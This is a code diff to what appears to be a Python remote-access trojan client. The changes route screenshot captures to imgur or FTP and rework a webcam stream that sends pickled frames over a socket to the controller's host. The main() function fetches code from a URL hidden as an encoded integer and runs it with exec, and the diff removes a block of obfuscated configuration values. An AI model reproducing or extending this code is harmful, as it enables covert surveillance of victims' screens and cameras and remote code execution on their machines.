@@ -114,38 +114,33 @@ class Client(object):
         return urllib2.urlopen(req).read()
 
     def _png(self, image):
-        try:
-            if type(image) == numpy.ndarray:
-                width, height = (image.shape[1], image.shape[0])
-                data = image.tobytes()
-            else:
-                width, height = (image.width, image.height)
-                data = image.rgb
-        except:
-            return "Input data type must be one of the following: 'numpy.ndarray','mss.screenshot'"
-        try:
-            line = width * 3
-            png_filter = struct.pack('>B', 0)
-            scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
-            magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
-            ihdr = [b'', b'IHDR', b'', b'']
-            ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
-            ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
-            ihdr[0] = struct.pack('>I', len(ihdr[2]))
-            idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
-            idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
-            idat[0] = struct.pack('>I', len(idat[2]))
-            iend = [b'', b'IEND', b'', b'']
-            iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
-            iend[0] = struct.pack('>I', len(iend[2]))
-            fileh = cStringIO.StringIO()
-            fileh.write(magic)
-            fileh.write(b''.join(ihdr))
-            fileh.write(b''.join(idat))
-            fileh.write(b''.join(iend))
-            return fileh
-        except Exception as e:
-            return str(e)
+        if type(image) == numpy.ndarray:
+            width, height = (image.shape[1], image.shape[0])
+            data = image.tobytes()
+        else:
+            width, height = (image.width, image.height)
+            data = image.rgb
+        line = width * 3
+        png_filter = struct.pack('>B', 0)
+        scanlines = b''.join([png_filter + data[y * line:y * line + line] for y in range(height)])
+        magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)
+        ihdr = [b'', b'IHDR', b'', b'']
+        ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
+        ihdr[3] = struct.pack('>I', zlib.crc32(b''.join(ihdr[1:3])) & 0xffffffff)
+        ihdr[0] = struct.pack('>I', len(ihdr[2]))
+        idat = [b'', b'IDAT', zlib.compress(scanlines), b'']
+        idat[3] = struct.pack('>I', zlib.crc32(b''.join(idat[1:3])) & 0xffffffff)
+        idat[0] = struct.pack('>I', len(idat[2]))
+        iend = [b'', b'IEND', b'', b'']
+        iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
+        iend[0] = struct.pack('>I', len(iend[2]))
+        fileh = cStringIO.StringIO()
+        fileh.write(magic)
+        fileh.write(b''.join(ihdr))
+        fileh.write(b''.join(idat))
+        fileh.write(b''.join(iend))
+        fileh.seek(0)
+        return fileh
 
     def _command(fx, cx=__command__, mx=__modules__):
         fx.status = threading.Event()
@@ -179,6 +174,7 @@ class Client(object):
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
+            fx.options   = {'upload': 'imgur'}
             if fx.status.is_set():
                 mx.update({fx.func_name: fx})
         elif fx.func_name is 'upload':
@@ -299,9 +295,9 @@ class Client(object):
         return self._options(x) if x else self._options()
 
     @_command
-    def stream(self, x=None):
+    def stream(self, x):
         """live stream client webcam"""
-        return self._webcam_stream(int(x)) if str(x).isdigit() else self._webcam_stream()
+        return self._webcam_stream(int(x)) if str(x).isdigit() else 'Error: invalid port number - {}'.format(x)
 
     @_command
     def status(self):
@@ -424,7 +420,8 @@ class Client(object):
         with mss() as screen:
             img = screen.grab(screen.monitors[0])
         png = self._png(img)
-        result = self._upload_imgur(png)
+        opt = str(self.screenshot.options['upload']).lower()
+        result = getattr(self, '_upload_{}'.format(opt))(png) if opt in ('imgur','ftp') else self._upload_imgur(png)
         self._result['screenshot'][time.ctime()] = result
         return result
 
@@ -437,18 +434,12 @@ class Client(object):
         if self.webcam.options['video']:
             if 'video' not in self._result['webcam']:
                 self._result['webcam'].update({'video': {}})
-            output = self._webcam_video()
-            if self.webcam.options['upload'].lower() == 'ftp':
-                result = self._upload_ftp(output)
+            result = self._webcam_video()
             self._result['webcam']['video'][time.ctime()] = result
         else:
             if 'image' not in self._result['webcam']:
                 self._result['webcam'].update({'image': {}})
-            output = self._webcam_image()
-            if self.webcam.options['upload'].lower() == 'imgur':
-                result = self._upload_imgur(output)
-            elif self.webcam.options['upload'].lower() == 'ftp':
-                result = self._upload_ftp(output)
+            result = self._webcam_image()
             self._result['webcam']['image'][time.ctime()] = result
         return result
 
@@ -757,21 +748,29 @@ class Client(object):
     def _upload_imgur(self, source):
         if not self.upload.options['imgur'].get('api_key'):
             return "Error: no api key found"
-        try:
-            source.seek(0)
-            result  = json.loads(self._post('https://api.imgur.com/3/upload', headers={'Authorization': self.upload.options['imgur'].get('api_key')}, data={'image': base64.b64encode(source.read()), 'type': 'base64'}))['data']['link']
-        except Exception as e:
-            result  = str(e)
+        if hasattr(source, 'getvalue'):
+            data    = source.getvalue()
+        elif hasattr(source, 'read'):
+            if hasattr(source, 'seek'):
+                source.seek(0)
+            data    = source.read()
+        else:
+            data    = bytes(source)
+        result  = json.loads(self._post('https://api.imgur.com/3/upload', headers={'Authorization': self.upload.options['imgur'].get('api_key')}, data={'image': base64.b64encode(data), 'type': 'base64'}))['data']['link']
         return result
 
     def _upload_pastebin(self, source):
         if not self.upload.status.is_set() and not override:
             return path
-        try:
-            source.seek(0)
-            result = self._post('https://pastebin.com/api/api_post.php', data={'api_option': 'paste', 'api_paste_code': source.read(), 'api_dev_key': self.upload.options['pastebin'].get('api_key'), 'api_user_key': self.upload.options['pastebin'].get('user_key')})
-        except Exception as e:
-            result = str(e)
+        if hasattr(source, 'getvalue'):
+            data    = source.getvalue()
+        elif hasattr(source, 'read'):
+            if hasattr(source, 'seek'):
+                source.seek(0)
+            data    = source.read()
+        else:
+            data    = bytes(source)
+        result = self._post('https://pastebin.com/api/api_post.php', data={'api_option': 'paste', 'api_paste_code': source.read(), 'api_dev_key': self.upload.options['pastebin'].get('api_key'), 'api_user_key': self.upload.options['pastebin'].get('user_key')})
         return result
      
     def _upload_ftp(self, source):
@@ -988,17 +987,36 @@ class Client(object):
             result = 'Upload error: {}'.format(str(e))
         return result
 
-    def _webcam_stream(self, limit=10):
+    def _webcam_stream(self, port, retries=5):
+        try:
+            host = self._socket.getpeername()[0]
+        except socket.error:
+            return self._connected.clear()
+        port = int(port)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        while retries > 0:
+            try:
+                sock.connect((host, port))
+            except socket.error:
+                retries -= 1
+            break
+        if not retries:
+            return 'Stream failed - connection error'
         dev = VideoCapture(0)
-        end = time.time() + limit
         try:
             while True:
-                ret,frame=dev.read()
-                data = pickle.dumps(frame)
-                self._socket.sendall(struct.pack("L", len(data))+data)
-                if time.time() > end:
-                    break
+                try:
+                    ret,frame=dev.read()
+                    data = pickle.dumps(frame)
+                    sock.sendall(struct.pack("L", len(data))+data)
+                    if time.time() > end:
+                        break
+                except Exception as e:
+                    self._print('Stream error: {}'.format(str(e)))
         finally:
+            dev.release()
+            sock.close()
+        if dev.isOpened():
             dev.release()
         return 'Streaming complete'
 
@@ -1350,29 +1368,13 @@ class Client(object):
 
 
 def main(*args, **kwargs):
-    kwargs = {
-#            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
-            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
-#            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
-            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
-            "__e__": "423224063517525567299427660991207813087967857812230603629111",
-            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
-            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
-            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
-            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
-            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
-            "__v__": "12620",
-	    "__w__": "12095051301478169748777225282050429328988589300942044190524177815713142069688900",
-            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
-            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
-    }
     if '__w__' in kwargs:
         exec 'import urllib' in globals()
         imports = urllib.urlopen(bytes(bytearray.fromhex(hex(long(kwargs['__w__'])).strip('0x').strip('L')))).read()
         exec imports in globals()
     if '__f__' not in kwargs and '__file__' in globals():
         kwargs['__f__'] = bytes(long(globals()['__file__'].encode('hex'), 16))
-    return Client(**kwargs)
+    Client(**kwargs)._start()
 
 if __name__ == '__main__':
     main()
